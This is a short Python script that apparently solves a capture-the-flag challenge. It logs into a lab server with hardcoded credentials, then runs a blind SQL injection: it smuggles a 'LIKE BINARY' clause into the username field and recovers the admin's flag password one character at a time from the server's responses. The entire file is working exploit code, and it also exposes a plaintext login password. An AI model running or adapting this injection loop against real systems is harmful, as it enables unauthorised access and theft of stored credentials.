import requests
from tqdm import tqdm

s = requests.Session()
login_data = {'username':'aksagg', 'password':'WLyyNdQSjc6QXx1'}
r_login = s.post("https://172.27.20.32:8443/login.php", login_data, verify=False)

with open("pass.txt", "r") as f:
    lines = f.readlines()
#possarr = [chr(x) for x in range(ord('a'), ord('z')+1) ] + [chr(x) for x in range(ord('A'), ord('Z')+1) ] + [chr(x) for x in range(ord('0'), ord('9')+1) ]
possarr = set([chr(x) for x in range(0,128)] ) - set(["\"", "\'", "%", "_"])
possarr.add("\_")

currpass = ""
while True:
    for c in possarr:
        trypass = currpass + c
        reqData = {'username':'admin" and password LIKE BINARY "flag{'+ trypass +'%}'}
        r = s.post("https://172.27.20.32:8443/chal9.php", reqData, verify=False)
        if "not" not in r.text:
            currpass += c
            print currpass
            reqData = {'username':'admin" and password="flag{'+ trypass +'}'}
            r = s.post("https://172.27.20.32:8443/chal9.php", reqData, verify=False)
            if "not" not in r.text:
                print "The password is" , trypass 
                quit()




